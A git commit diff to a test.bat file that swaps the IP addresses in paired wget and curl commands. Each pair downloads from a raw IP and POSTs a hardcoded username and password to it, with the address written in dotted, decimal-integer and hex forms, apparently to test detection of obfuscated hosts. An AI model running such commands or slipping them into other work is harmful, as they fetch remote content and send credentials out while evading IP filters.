d62eb3e05f116a87c697aebeffcdad80a4486e76
RonMankivsky <87318489+RonMankivsky@users.noreply.github.com>
2022-01-02 14:47:01 +0200

    Update test.bat

--- test.bat
+++ test.bat
@@ -1,13 +1,10 @@
-wget 1.15.121.25 -o /tmp/test1
-curl -X POST -d "username=tembel&password=1q2w3e" 1.15.121.25
+wget 103.48.37.61 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 103.48.37.61
 
-wget 17791257 -o /tmp/test1
-curl -X POST -d "username=tembel&password=1q2w3e" 17791257
+wget 1731208509 -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 1731208509
 
-wget 0x010f7919 -o /tmp/test1
-curl -X POST -d "username=tembel&password=1q2w3e" 0x010f7919
-
-wget 116.23.174 -o /tmp/test1
-curl -X POST -d "username=tembel&password=1q2w3e" 116.23.174
+wget 0x6730253d -o /tmp/test1
+curl -X POST -d "username=tembel&password=1q2w3e" 0x6730253d
 
 
